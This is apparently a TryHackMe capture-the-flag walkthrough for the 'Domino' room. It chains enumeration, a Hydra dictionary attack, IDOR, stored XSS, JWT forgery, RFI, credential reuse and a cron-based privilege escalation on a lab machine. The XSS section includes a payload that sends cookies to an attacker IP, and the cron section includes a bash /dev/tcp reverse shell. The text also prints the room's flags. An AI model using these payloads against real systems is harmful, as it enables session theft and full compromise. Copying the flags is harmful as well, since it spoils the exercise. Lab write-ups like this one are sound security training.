# TryHackMe — Domino

This walkthrough describes the complete attack path for the **Domino** TryHackMe room.

The room involves web enumeration, credential discovery, password spraying/dictionary attacks, IDOR, stored XSS, session hijacking, JWT manipulation, Remote File Inclusion (RFI), reverse-shell access, credential reuse, and cron-based privilege escalation.

The attack begins with enumeration of the web application and progresses through several vulnerabilities until root access is obtained.

**Difficulty — Medium**

---

**MACHINE-IP:** `10.112.151.132`

---

# Initial Access

## Scanning

I started by enumerating the open TCP ports and identifying the services running on the target.

The target was:

```text
10.112.151.132
```

I used Nmap with default scripts, service detection, and output logging:

```bash
sudo nmap -sC -sV -p 10.112.151.132 -oN nmap.txt
```

The scan revealed two accessible services:

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: NexusCorp Portal
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux
```

With only SSH and HTTP exposed, I focused my initial enumeration on the web application.

---

# Web Enumeration

I opened the application in my browser and intercepted requests using **Burp Suite**.

The home page presented an employee login portal.

One useful piece of information was immediately visible in the username field. The placeholder indicated that usernames followed the format:

```text
firstname.lastname
```

I continued enumerating the application and found two interesting links beneath the login form:

```text
Forgot password?
Our Team
```

The **Our Team** page was particularly interesting.

It redirected me to:

```text
/team.php
```

The page contained information about company employees, including:

* Names
* Roles
* Email addresses

The email addresses matched the username format used by the login form.

This gave me a list of potentially valid usernames that could be used for further authentication testing.

---

# Credential Attack

Before launching a dictionary attack, I first performed a normal login attempt using arbitrary credentials.

Using Burp Suite, I inspected the request and response.

The login functionality used:

```http
POST
```

with the following parameters:

```text
username=
password=
```

When authentication failed, the response contained a predictable string:

```text
Invalid credentials
```

This gave me everything required to distinguish successful and unsuccessful authentication attempts.

I then used Hydra against the login endpoint:

```bash
hydra -q -u -L users.txt -P /usr/share/wordlists/rockyou.txt \
10.112.151.132 http-post-form \
'/index.php:username=^USER^&password=^PASS^:Invalid credentials'
```

The attack quickly identified several accounts using an extremely weak password.

I confirmed the credentials by successfully authenticating as:

```text
sarah.johnson
```

This gave me access to the employee dashboard.

---

# Employee Dashboard

After authentication, I was redirected to:

```text
/dashboard.php
```

The dashboard exposed several application features.

One of the first endpoints I investigated was the **My Profile API**.

The endpoint returned information about the currently authenticated user.

The URL contained an `id` parameter:

```text
id=3
```

Since the application appeared to use sequential numeric user IDs, I suspected that the parameter might be vulnerable to **Insecure Direct Object Reference (IDOR)**.

---

# IDOR

I modified the `id` parameter and requested profiles belonging to other users.

The application did not appear to verify that the requested profile belonged to the currently authenticated user.

By changing the identifier, I was able to access information belonging to other accounts, including the administrator:

```text
laura.hayes
```

The exposed profile contained additional information in the user's notes field.

The first flag was hidden there.

<details>
<summary>Spoiler Alert!</summary>

```text
THM{1d0r_h0r1z0nt4l_4cc3ss_fl4g1}
```

</details>

The IDOR vulnerability provided unauthorized access to other users' information, but it did not immediately provide a route to administrative privileges.

I therefore continued investigating the remaining dashboard functionality.

---

# Support Tickets

Another interesting feature was the support-ticket functionality.

The endpoint:

```text
/support/create.php
```

allowed authenticated users to create support tickets.

I submitted a test ticket and then checked:

```text
/support/index.php
```

The ticket was subsequently marked as:

```text
Reviewed
```

This suggested that another user, presumably an administrator, was actively reviewing submitted tickets.

That made the ticket functionality particularly interesting from an XSS perspective.

---

# Stored XSS

I began testing the ticket form for cross-site scripting.

Before doing so, I inspected the application's session cookie using the browser's Web Developer Tools.

The important property was:

```text
HttpOnly: false
```

Because the session cookie was accessible to JavaScript, a successful XSS attack could potentially read the administrator's session cookie.

I prepared a listener on my attacking machine:

```bash
nc -lvnp 81
```

The listener was configured to receive the HTTP request generated by the XSS payload.

I first tested the **Subject** field, but the payload was not executed.

I then moved the payload to the **Message** field:

```html
<script>fetch("http://192.168.132.218:81/test.php?data=" + btoa(document.cookie));</script>
```

After the ticket was reviewed by the administrator, my listener received a request containing the administrator's session token.

This confirmed that the ticket functionality was vulnerable to stored XSS and that the administrator's session could be hijacked.

---

# Session Hijacking

The captured session belonged to:

```text
laura.hayes
```

The administrator cookie was:

```text
nexus_session=eyJ1c2VyX2lkIjogMSwgInVzZXJuYW1lIjogImxhdXJhLmhheWVzIiwgInJvbGUiOiAiYWRtaW4ifQ==.2d1632df0b5a19cc9a8db3b2e72e612b0110c4e4aaed1265006b8c0bc73f6834
```

The decoded session data was:

```json
{
  "user_id": 1,
  "username": "laura.hayes",
  "role": "admin"
}
```

I replaced my existing session cookie with the captured administrator cookie using Firefox's Web Developer Tools.

After refreshing the application, I was authenticated as:

```text
laura.hayes
```

I could now access:

```text
/admin/index.php
```

The administrator panel exposed additional functionality and revealed the second flag under **System Status**.

<details>
<summary>Spoiler Alert!</summary>

```text
THM{bl1nd_x55_s3ss10n_h1j4ck_fl4g2}
```

</details>

At this point, I had successfully escalated from a normal employee account to administrator privileges within the web application.

---

# File Viewer API

With administrative access established, I returned to the dashboard and investigated the remaining functionality.

The **File Viewer API** immediately stood out because it interacted directly with the server's filesystem.

The application documentation indicated that access required a JWT obtained from:

```text
/api/auth/token.php
```

The resulting token was then supplied to:

```text
/api/files.php
```

using the HTTP header:

```http
Authorization: Bearer <token>
```

I retrieved a token and attempted to read:

```text
/etc/passwd
```

The server rejected the request and returned an error indicating that administrative privileges were required.

This was unexpected because I was already authenticated as the administrator.

The error suggested that the problem was related to the contents of the JWT itself.

---

# JWT Analysis

A JSON Web Token consists of three Base64URL-encoded components:

```text
header.payload.signature
```

The second component is the payload.

After decoding the payload of the token generated for `laura.hayes`, I found:

```json
{
  "sub": "laura.hayes",
  "role": "user",
  "iat": 1787288805,
  "exp": 1787292405
}
```

The important value was:

```json
"role": "user"
```

Although the web application session identified `laura.hayes` as an administrator, the token-generation endpoint was issuing a JWT with the lower-privileged `user` role.

The token supplied by the application was:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYXVyYS5oYXllcyIsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzg3Mjg4ODA1LCJleHAiOjE3ODcyOTI0MDV9.P1DDgoCV37FUfNMN4gVQhWWdNqTnNKR0PAvY6G3kWrc
```

The token was intended to be used as:

```http
Authorization: Bearer <token>
```

when accessing:

```text
/api/files.php
```

This led me to investigate whether the application's JWT implementation properly validated the token signature.

---

# JWT Signature Validation

A correctly implemented JWT should reject modifications to the header or payload because the signature is calculated over those values.

However, insecure implementations sometimes fail to properly verify the signature.

To test this behavior, I modified the JWT payload so that the role was changed from:

```json
"role": "user"
```

to:

```json
"role": "admin"
```

I then generated a modified token and used it against the file API.

The first attempt to read:

```text
/etc/passwd
```

still failed, but the error message had changed.

The server now indicated that authentication had succeeded, but that only files inside the web root could be accessed.

This was a significant discovery.

It confirmed that the modified JWT was being accepted by the application.

---

# Reading the File Viewer Source

Since the application restricted file access to the web root, I attempted to read the PHP source code of the file viewer itself:

```text
/var/www/html/api/files.php
```

The request succeeded.

Inspecting the source code revealed the underlying problem with the endpoint.

The file viewer accepted a remote file path and processed its contents as PHP.

This introduced a **Remote File Inclusion (RFI)** vulnerability.

Because the application was capable of retrieving and executing remote PHP content, this vulnerability could be used to achieve remote command execution.

---

# Remote File Inclusion

I prepared a PHP reverse shell on the attacking machine and hosted it using a simple Python HTTP server.

The target could then retrieve the remote PHP file through the vulnerable file viewer.

The vulnerable endpoint accepted the remote resource through the:

```text
name
```

parameter.

I supplied the URL of the hosted PHP payload to the endpoint.

The server fetched the remote PHP code and executed it.

---

# Reverse Shell

I started a listener on my attacking machine to receive the connection from the target.

Once the PHP payload was executed, the target connected back to my listener.

I successfully obtained a shell as:

```text
www-data
```

This marked initial operating-system access.

I could now read the third flag:

```text
/opt/flag3.txt
```

<details>
<summary>Spoiler Alert!</summary>

```text
THM{rf1_2_rc3_f00th0ld_fl4g3}
```

</details>

---

# Privilege Escalation

With a shell as `www-data`, I began local enumeration to identify a route toward a higher-privileged account.

I first looked for users with an interactive Bash login shell:

```bash
grep "/bin/bash" /etc/passwd
```

Two accounts immediately stood out:

```text
devops
ubuntu
```

I then returned to the web root and searched for configuration files and other potentially sensitive information.

---

# Discovering Database Credentials

During the enumeration of:

```text
/var/www/html
```

I discovered an unusually named PHP file:

```text
/var/www/html/db12312312381203812093.php
```

I inspected its contents.

The file contained database connection information, including clear-text credentials.

Although the username did not immediately identify itself as an operating-system account, the password strongly suggested that the credentials could have been reused elsewhere.

The password was:

```text
D3v0ps!2024
```

I tested the credentials against the previously discovered `devops` account.

The credentials were accepted.

---

# SSH as devops

Because SSH was exposed on port 22, I attempted to authenticate to the target as:

```text
devops
```

using the discovered password.

The SSH login succeeded:

```bash
ssh devops@10.112.151.132
```

I now had a shell as the `devops` user.

This allowed me to access the fourth flag from the user's home directory.

<details>
<summary>Spoiler Alert!</summary>

```text
THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}
```

</details>

The successful login demonstrated a common post-exploitation issue: **credential reuse** between application/database credentials and an operating-system account.

---

# Enumerating as devops

I restarted local enumeration from the new `devops` context.

The `/opt/` directory contained several interesting files and directories.

One particularly interesting location was:

```text
/opt/tools
```

where I found:

```text
PsPy64
```

**PsPy** is a Linux process-monitoring tool that can observe processes without requiring root privileges.

Because I was able to execute it, I launched it and allowed it to monitor the system.

---

# Discovering the Root Cron Job

After allowing PsPy to run for a while, I noticed a repeating pattern.

Approximately once per minute, a cron process executed as root.

Shortly afterward, the following script was repeatedly executed:

```text
/opt/monitoring/health_report.sh
```

The important detail was that the script was being executed with root privileges.

I then inspected the permissions on the file.

The script was writable by the `devops` user.

This created a straightforward privilege-escalation path:

```text
devops
   ↓
Writable script
   ↓
Cron executes script
   ↓
Script executes as root
   ↓
Root shell
```

---

# Cron-Based Privilege Escalation

Because `health_report.sh` was writable by `devops` but executed by root, I modified the script to execute a reverse shell.

The reverse-shell command used was:

```bash
bash -i >& /dev/tcp/192.168.132.218/4445 0>&1
```

I then started a listener on my attacking machine:

```bash
nc -lvnp 4445
```

After saving the modified script, I waited for the scheduled cron job to execute.

Shortly afterward, the target connected back to my listener.

The resulting shell was running as:

```text
root
```

This confirmed successful privilege escalation.

I could now access the final flag:

```text
/root/root.txt
```

<details>
<summary>Spoiler Alert!</summary>

```text
THM{pr1v3sc_cr0n_r00t_fl4g5}
```

</details>

---

# Room Completed

The room was completed by chaining several vulnerabilities and configuration weaknesses together.

The complete attack path was:

1. Scan the target with Nmap.
2. Discover SSH and HTTP.
3. Enumerate the NexusCorp employee portal.
4. Discover valid usernames through `/team.php`.
5. Identify the login request structure using Burp Suite.
6. Perform a dictionary attack against the login form.
7. Authenticate as `sarah.johnson`.
8. Discover the profile API.
9. Exploit the `id` parameter for horizontal IDOR.
10. Access `laura.hayes`'s profile and retrieve the first flag.
11. Discover the support-ticket functionality.
12. Identify that the session cookie was not protected by `HttpOnly`.
13. Exploit stored XSS in the ticket message.
14. Capture the administrator's session cookie.
15. Hijack the session and access the administrator panel.
16. Retrieve the second flag.
17. Investigate the File Viewer API.
18. Obtain a JWT for the administrator account.
19. Decode the JWT and identify the incorrect `user` role.
20. Exploit improper JWT signature validation.
21. Access the File Viewer with an administrator JWT.
22. Read the `files.php` source code.
23. Identify the Remote File Inclusion vulnerability.
24. Host a PHP reverse shell remotely.
25. Trigger the RFI and obtain a shell as `www-data`.
26. Retrieve the third flag.
27. Enumerate local users and application files.
28. Discover reused credentials for the `devops` account.
29. SSH into the target as `devops`.
30. Retrieve the fourth flag.
31. Enumerate `/opt/` and discover PsPy.
32. Observe the root cron job executing `health_report.sh`.
33. Discover that `devops` can modify the script.
34. Add a reverse shell to the script.
35. Wait for cron to execute it as root.
36. Obtain a root shell.
37. Retrieve the fifth and final flag.

---

# Final Attack Chain

```text
Nmap Enumeration
       ↓
Employee Portal
       ↓
Username Enumeration
       ↓
Dictionary Attack
       ↓
Employee Account
       ↓
IDOR
       ↓
Admin Profile
       ↓
Stored XSS
       ↓
Admin Session Hijacking
       ↓
Admin Panel
       ↓
JWT Analysis
       ↓
JWT Signature Validation Bypass
       ↓
File Viewer
       ↓
Remote File Inclusion
       ↓
Remote Code Execution
       ↓
www-data Shell
       ↓
Credential Discovery
       ↓
SSH Credential Reuse
       ↓
devops
       ↓
PsPy Process Enumeration
       ↓
Root Cron Job
       ↓
Writable health_report.sh
       ↓
Root Reverse Shell
       ↓
ROOT
```

# Conclusion

The NexusCorp attack chain demonstrates how several relatively small security weaknesses can be chained into complete system compromise.

The initial foothold came from weak credentials discovered through username enumeration and a dictionary attack. From there, an IDOR vulnerability exposed additional user information, while a stored XSS vulnerability allowed the administrator's session to be hijacked.

Administrative access to the web application then exposed a vulnerable file viewer. Improper JWT validation allowed the token's privilege information to be manipulated, ultimately exposing a Remote File Inclusion vulnerability that provided operating-system access as `www-data`.

Finally, credential reuse allowed lateral movement to the `devops` account. Enumeration with PsPy revealed a root-owned cron job executing a script writable by `devops`, which provided the final privilege-escalation path to root.

The complete chain was therefore:

```text
Weak Credentials
    → IDOR
    → Stored XSS
    → Session Hijacking
    → JWT Abuse
    → RFI / RCE
    → Credential Reuse
    → Cron Privilege Escalation
    → Root
```
